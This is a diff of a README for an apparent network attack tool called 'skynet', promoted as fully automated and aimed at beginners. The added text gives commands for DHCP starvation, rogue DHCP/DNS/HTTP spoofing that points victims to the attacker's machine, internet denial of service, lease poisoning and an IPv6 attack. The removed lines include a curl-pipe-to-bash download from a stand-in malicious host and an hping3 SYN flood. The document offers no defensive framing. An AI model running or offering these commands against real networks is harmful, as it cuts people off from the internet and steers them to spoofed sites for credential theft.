@@ -1,18 +1,20 @@
 # Skynet Command Showcase
 
 This repository demonstrates various skynet commands and attacks. Each command is accompanied by a brief description and an image illustrating the attack.
+This modes of attack are 100% automated. The user only have to execute it and wait. They are designed for beginners.
+**IMPORTANT: to try to poison devices that have already connected, use "--delete-leases-attack" argument with all the command.**
 
 ## Table of Contents
 
 1. [Command 1: Website spoofing](#command-1-website-spoofing)
-2. [Command 2: Remote Code Execution](#command-2-remote-code-execution)
-3. [Command 3: Credential Harvesting](#command-3-credential-harvesting)
-4. [Command 4: Denial of Service](#command-4-denial-of-service)
+2. [Command 2: Internet DoS](#command-2-internet-DoS)
+3. [Command 3: Passive internet DoS with message](#command-3-passive-internet-DoS-with-message)
+4. [Command 4: IPv6 attack](#command-4-IPv6-attack)
 
 ## Command 1: Website spoofing
 
 ### Description
-Utilizes a phishing attack to trick users into revealing sensitive information.
+First does a DoS to the legit DHCP, then starts a rogue DHCP+DNS+HTTP server instances. All in the second phase pointing to the attacker's machine.
 
 ### Command
 ```bash
@@ -22,41 +24,41 @@ sudo ./skynet --attack --create-pool --all-queries-to-this-host --create-trojan-
 ### Image
 ![spoofing](../images/website-spoofing.png)
 
-## Command 2: Remote Code Execution
+## Command 2: Internet DoS
 
 ### Description
-Executes arbitrary code on a remote system to gain unauthorized access.
+This attack leaves hosts that receive configuration via DHCP without an Internet connection.
 
 ### Command
 ```bash
-curl -s https://malicious-website.com/shell.sh | bash
+sudo ./skynet --fast-attack --create-random-pool
 ```
 
 ### Image
-![Remote Code Execution](images/remote_code_execution.png)
+![Internet DoS](../images/internet-DoS.png)
 
-## Command 3: Credential Harvesting
+## Command 3: Passive internet DoS with message
 
 ### Description
-Performs a credential harvesting attack to obtain login credentials.
+This attack leaves a message on the server it attacks and leaves without internet due to the absence of a DHCP server.
 
 ### Command
 ```bash
-malicious_script.py --target https://target-login-page.com
+sudo ./skynet --leave-a-message "t-P0wned HAHA" --attack
 ```
 
 ### Image
-![Credential Harvesting](images/credential_harvesting.png)
+![Passive internet DoS with message](images/passive-internet-DoS-with-message.png)
 
-## Command 4: Denial of Service
+## Command 4: IPv6 attack
 
 ### Description
-Launches a Denial of Service attack to disrupt the target's services.
+This attack is for the IPv6 protocol.
 
 ### Command
 ```bash
-hping3 -S -c 1000 -p 80 --rand-source target-ip
+sudo ./skynet --ipv6 --no-draw --continued-attack
 ```
 
 ### Image
-![Denial of Service](images/denial_of_service.png)
+![IPv6 attack](images/IPv6-attack.png)
